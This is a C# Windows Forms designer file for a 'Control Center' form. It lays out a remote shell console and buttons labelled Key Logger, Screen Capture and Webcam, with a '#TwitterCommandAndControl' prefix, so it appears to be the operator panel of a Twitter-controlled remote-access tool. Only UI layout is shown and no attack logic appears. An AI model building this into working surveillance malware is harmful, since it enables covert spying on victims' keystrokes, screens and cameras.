namespace ControlCenter
{
    partial class Main
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.label1 = new System.Windows.Forms.Label();
            this.ShellButton = new System.Windows.Forms.Button();
            this.ShellOutput = new System.Windows.Forms.TextBox();
            this.CommandText = new System.Windows.Forms.TextBox();
            this.CommandButton = new System.Windows.Forms.Button();
            this.label2 = new System.Windows.Forms.Label();
            this.ScreenCapture = new System.Windows.Forms.Button();
            this.Webcam = new System.Windows.Forms.Button();
            this.KeyLogger = new System.Windows.Forms.Button();
            this.ShellPrefix = new System.Windows.Forms.ComboBox();
            this.SuspendLayout();
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Location = new System.Drawing.Point(13, 12);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(36, 13);
            this.label1.TabIndex = 1;
            this.label1.Text = "Prefix:";
            // 
            // ShellButton
            // 
            this.ShellButton.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.ShellButton.Location = new System.Drawing.Point(435, 7);
            this.ShellButton.Name = "ShellButton";
            this.ShellButton.Size = new System.Drawing.Size(75, 23);
            this.ShellButton.TabIndex = 2;
            this.ShellButton.Text = "Start Shell";
            this.ShellButton.UseVisualStyleBackColor = true;
            this.ShellButton.Click += new System.EventHandler(this.ShellButton_Click);
            // 
            // ShellOutput
            // 
            this.ShellOutput.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.ShellOutput.Font = new System.Drawing.Font("Courier New", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.ShellOutput.Location = new System.Drawing.Point(12, 35);
            this.ShellOutput.Multiline = true;
            this.ShellOutput.Name = "ShellOutput";
            this.ShellOutput.ReadOnly = true;
            this.ShellOutput.Size = new System.Drawing.Size(773, 289);
            this.ShellOutput.TabIndex = 3;
            this.ShellOutput.DoubleClick += new System.EventHandler(this.ShellOutput_DoubleClick);
            // 
            // CommandText
            // 
            this.CommandText.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.CommandText.Location = new System.Drawing.Point(49, 332);
            this.CommandText.Name = "CommandText";
            this.CommandText.Size = new System.Drawing.Size(655, 20);
            this.CommandText.TabIndex = 4;
            // 
            // CommandButton
            // 
            this.CommandButton.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.CommandButton.Location = new System.Drawing.Point(710, 330);
            this.CommandButton.Name = "CommandButton";
            this.CommandButton.Size = new System.Drawing.Size(75, 23);
            this.CommandButton.TabIndex = 5;
            this.CommandButton.Text = "Send";
            this.CommandButton.UseVisualStyleBackColor = true;
            this.CommandButton.Click += new System.EventHandler(this.CommandButton_Click);
            // 
            // label2
            // 
            this.label2.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.label2.AutoSize = true;
            this.label2.Location = new System.Drawing.Point(12, 335);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(31, 13);
            this.label2.TabIndex = 6;
            this.label2.Text = "Cmd:";
            // 
            // ScreenCapture
            // 
            this.ScreenCapture.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.ScreenCapture.Location = new System.Drawing.Point(593, 7);
            this.ScreenCapture.Name = "ScreenCapture";
            this.ScreenCapture.Size = new System.Drawing.Size(115, 23);
            this.ScreenCapture.TabIndex = 7;
            this.ScreenCapture.Text = "Screen Capture";
            this.ScreenCapture.UseVisualStyleBackColor = true;
            this.ScreenCapture.Click += new System.EventHandler(this.ScreenCapture_Click);
            // 
            // Webcam
            // 
            this.Webcam.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.Webcam.Location = new System.Drawing.Point(714, 7);
            this.Webcam.Name = "Webcam";
            this.Webcam.Size = new System.Drawing.Size(71, 23);
            this.Webcam.TabIndex = 8;
            this.Webcam.Text = "Webcam";
            this.Webcam.UseVisualStyleBackColor = true;
            this.Webcam.Click += new System.EventHandler(this.Webcam_Click);
            // 
            // KeyLogger
            // 
            this.KeyLogger.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.KeyLogger.Location = new System.Drawing.Point(516, 7);
            this.KeyLogger.Name = "KeyLogger";
            this.KeyLogger.Size = new System.Drawing.Size(71, 23);
            this.KeyLogger.TabIndex = 9;
            this.KeyLogger.Text = "Key Logger";
            this.KeyLogger.UseVisualStyleBackColor = true;
            this.KeyLogger.Click += new System.EventHandler(this.KeyLogger_Click);
            // 
            // ShellPrefix
            // 
            this.ShellPrefix.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.ShellPrefix.FormattingEnabled = true;
            this.ShellPrefix.Items.AddRange(new object[] {
            "#TwitterCommandAndControl"});
            this.ShellPrefix.Location = new System.Drawing.Point(49, 9);
            this.ShellPrefix.Name = "ShellPrefix";
            this.ShellPrefix.Size = new System.Drawing.Size(380, 21);
            this.ShellPrefix.TabIndex = 10;
            // 
            // Main
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(794, 364);
            this.Controls.Add(this.ShellPrefix);
            this.Controls.Add(this.KeyLogger);
            this.Controls.Add(this.Webcam);
            this.Controls.Add(this.ScreenCapture);
            this.Controls.Add(this.label2);
            this.Controls.Add(this.CommandButton);
            this.Controls.Add(this.CommandText);
            this.Controls.Add(this.ShellOutput);
            this.Controls.Add(this.ShellButton);
            this.Controls.Add(this.label1);
            this.Name = "Main";
            this.Text = "Control Center";
            this.Load += new System.EventHandler(this.Main_Load);
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.Button ShellButton;
        private System.Windows.Forms.TextBox ShellOutput;
        private System.Windows.Forms.TextBox CommandText;
        private System.Windows.Forms.Button CommandButton;
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.Button ScreenCapture;
        private System.Windows.Forms.Button Webcam;
        private System.Windows.Forms.Button KeyLogger;
        private System.Windows.Forms.ComboBox ShellPrefix;
    }
}

